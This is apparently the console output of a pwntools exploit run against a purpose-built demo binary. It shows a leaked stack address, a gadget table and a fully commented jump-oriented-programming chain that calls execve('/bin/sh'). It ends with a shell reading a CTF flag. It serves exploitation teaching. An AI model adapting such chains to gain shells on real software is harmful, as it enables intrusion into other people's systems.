 ```
 python3 pwn-jop.py BIN=./jop 
[*] '/demos/jop-demo/jop'
    Arch:     amd64-64-little
    RELRO:    No RELRO
    Stack:    No canary found
    NX:       NX enabled
    PIE:      No PIE (0x400000)
[+] Starting local process '/demos/jop-demo/jop': pid 4309
[*] [Available JOP Gadgets]
[*] 
    xchg_rax_rdi_jmp_rax_1 =        0x401000  # xchg rax, rdi; jmp qword ptr [rax + 1];
    xor_rax_rax_jmp_rdx =           0x40100a  # xor rax, rax; jmp qword ptr [rdx];
    pop_rsp_rdi_rcx_rdx_jmp_rdx_1 = 0x40100f  # pop rsp; pop rdi; pop rcx; pop rdx; jmp qword ptr [rdi + 1];
    mov_rsi_rcx_jmp_rdx =           0x40101b  # mov rsi, qword ptr [rcx + 0x10]; jmp qword ptr [rdx];
    pop_rdx_jmp_rcx =               0x401021  # pop rdx; jmp qword ptr [rcx];
    add_rax_rdx_jmp_rcx =           0x401024  # add rax, rdx; jmp qword ptr [rcx];
    pop_rcx_jmp_rdx =               0x401029  # pop rcx; jmp qword ptr [rdx];
    syscall =                       0x401163  # syscall;
    ret =                           0x401165  # add rsp, 0x8; jmp [rsp-0x8]; [Dispatcher]
[*] Stack Leaked at 0x7ffc2774d538
[*] [JOP Chain Follows]
[*] 
    # Set rdi = &'/bin/sh'                      (xor rax, rax; pop rdx; add rax, rdx; xchg rax, rdi; ret)
    payload += p64(xor_rax_rax_jmp_rdx)         # [0x30]    rax=0
    payload += p64(pop_rdx_jmp_rcx)             # [0x38]    rdx=rsp=/bin/sh
    payload += p64(rsp)                         # [0x40]
    payload += p64(add_rax_rdx_jmp_rcx)         # [0x48]    rax=rdx=/bin/sh
    payload += p64(xchg_rax_rdi_jmp_rax_1)      # [0x50]    rdi=rax; jump to rdi+1 (0x401165)
    
    # Reset rdx
    payload += p64(pop_rdx_jmp_rcx)             # [0x58]    rdx=rsp+8; jmp 0x401165
    payload += p64(rsp + context.bytes*1)       # [0x60]
    
    # Set rsi = 0x00                            (pop rcx; mov rsi, [rcx+0x10]; ret)
    payload += p64(pop_rcx_jmp_rdx)             # [0x68]    
    payload += p64(rsp + context.bytes*2)       # [0x70]    rcx=rsp+16
    payload += p64(mov_rsi_rcx_jmp_rdx)         # [0x78]    rsi=0x0
    
    # Reset rcx
    payload += p64(pop_rcx_jmp_rdx)             # [0x80]    rcx=rsp+8
    payload += p64(rsp + context.bytes*1)       # [0x88]
    
    # Set rax = SYS_execve                      (xor rax, rax; pop rdx; add rax, rdx; ret)
    payload += p64(xor_rax_rax_jmp_rdx)         # [0x90]    rax=0
    payload += p64(pop_rdx_jmp_rcx)             # [0x98]    rdx=sys_execve
    payload += p64(constants.SYS_execve)        # [0xa0]
    payload += p64(add_rax_rdx_jmp_rcx)         # [0xa8]    rax=0x0+sys_execve
    
    # Set rdx = 0x00 & Pwn                      (pop rdx; syscall)
    payload += p64(pop_rdx_jmp_rcx)             # [0xb0]    rdx=0x0
    payload += p64(0x00)                        # [0xb8]
    payload += p64(syscall)                     # [0xc0]    syscall
[*] Switching to interactive mode
Thank you for your feedback!
$ cat flag.txt
flag{i_sure_wished_this_worked_remotely_too}
```